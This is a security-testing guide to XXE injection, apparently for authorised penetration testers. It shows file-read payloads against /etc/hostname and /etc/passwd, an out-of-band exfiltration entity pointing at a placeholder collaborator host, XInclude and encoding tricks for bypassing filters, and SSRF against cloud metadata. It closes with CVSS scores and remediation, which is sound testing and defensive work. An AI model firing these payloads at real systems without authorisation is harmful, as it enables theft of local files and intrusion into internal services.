# XML External Entity (XXE) Injection

*Keywords: XXE, XML external entity, DOCTYPE, ENTITY, SYSTEM, file disclosure via XML, SVG XXE, SOAP XXE, DOCX/XLSX XXE, billion laughs, blind XXE, OOB exfiltration, parameter entity, SAML XXE, XML parser, ent expansion.*

## What XXE is and where to find it

XXE happens when an XML parser processes a document that defines external entities and the parser resolves them — letting an attacker read local files, reach internal URLs (SSRF), or cause DoS. Any endpoint that accepts XML is a candidate, and many are non-obvious: classic `Content-Type: application/xml` / `text/xml` bodies, SOAP web services, SAML responses, RSS/Atom imports, and **file formats that are secretly XML** — SVG images, DOCX/XLSX/PPTX (a zip of XML), and some PDF/config uploads. If a feature parses an uploaded `.svg`/`.docx` or accepts an XML API body, test it for XXE.

## XXE detection — file read and blind/OOB (impact-limited)

**In-band file read** — add a DOCTYPE with an external entity and reference it in a reflected field:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]>
<root><name>&x;</name></root>
```
If the response echoes the file contents, XXE is proven. Read a **non-sensitive** file (`/etc/hostname`, `file:///etc/passwd` is the traditional proof but prefer hostname if policy limits PII) to demonstrate reach — do not exfiltrate secrets/keys in bulk. **Blind XXE (no reflection)** — confirm via out-of-band interaction to a listener/collaborator *you control and is in scope*: use a parameter entity to fetch an external DTD that triggers a callback:
```xml
<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://<your-in-scope-collab>/e.dtd"> %ext;]>
```
The DTD then defines an entity that appends a file to a URL for OOB exfiltration. A single callback proving the parser reached your host is sufficient PoC — no need to pull large files. XXE can also hit `http://169.254.169.254/` (SSRF to metadata) — read one field to prove, don't harvest.

## XXE variants and WAF bypass

**SVG upload** — embed the DOCTYPE in an uploaded SVG that the server rasterizes; the rendered image or an OOB hit proves it. **DOCX/XLSX** — unzip, inject the DOCTYPE into `word/document.xml` / `xl/workbook.xml`, re-zip, upload. **Bypasses**: if `<!DOCTYPE` is blocked, try UTF-16/UTF-7 encoding of the body, or if only inline entities are filtered use parameter entities in an external DTD. If external DTDs are disabled but a local DTD exists, use **XInclude** (`<xi:include href="file:///etc/passwd"/>`) which doesn't need a DOCTYPE. Avoid the **billion-laughs / entity-expansion DoS** payload against a live target — that's a denial-of-service and typically out of rules of engagement; note the parser is vulnerable and report it rather than triggering it.

## XXE CVSS and remediation

XXE enabling arbitrary local file read (unauthenticated): `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = 7.5; XXE that reaches internal services / cloud metadata (SSRF pivot, scope change): `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` ≈ 8.6. Root cause: an XML parser configured to resolve external entities/DTDs on untrusted input. Remediation: disable DTDs entirely (`FEATURE_SECURE_PROCESSING`, `disallow-doctype-decl=true`, libxml `noent=false`/`LIBXML_NONET`, .NET `XmlResolver=null`); if DTDs are needed, disable external general + parameter entities and network access; prefer non-XML formats (JSON) where possible; validate uploads by content, not extension; keep the parser account least-privileged so a file read reveals little.
